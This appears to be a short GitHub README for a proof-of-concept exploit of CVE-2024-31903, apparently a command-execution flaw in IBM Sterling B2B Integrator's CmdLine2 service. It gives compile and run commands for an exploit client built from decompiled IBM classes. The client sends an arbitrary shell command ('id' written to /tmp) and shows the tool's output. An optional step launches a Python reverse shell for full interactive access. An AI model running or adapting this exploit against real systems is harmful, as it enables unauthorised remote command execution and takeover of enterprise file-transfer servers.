# CVE-2024-31903

> README to be updated soon

## Instructions 

Assuming you have retrieved the relevant files from the JAR decompilation. Will not be uplaoded here as they constitute IBM IP



1. Compilation

```bash
${B2BHOME}/INSTALL/jdk/bin/javac src/com/sterlingcommerce/woodstock/  
services/cmdline2/*.java
```

2.	Execution 

```bash
${B2BHOME}/INSTALL/jdk/bin/java -classpath src/ com.sterlingcommerce.woodstock.services.cmdline2.Main '/bin/sh -c "id > /tmp/withsecureresult"' SEND  
[+] Creating object...  
[+] Sending object...  
[+] ...Sent!  
[+] Receiving header...  
[+] ...header received:  
RESULT  
[+] Receiving result...  
[+] Result received:  
##[DEBUG]## CmdLine2Result:  
fileSize=0  
outputNameLong=null  
outputNameShort=null  
******* end of CmdLine2Result *******  
```

3.	(Optional) Fully Interactive Shell 

```bash 
${B2BHOME}/INSTALL/jdk/bin/java -classpath src/ com.sterlingcommerce.woodstock.services.cmdline2.Main 'python3 /tmp/revshell.py' SEND
```

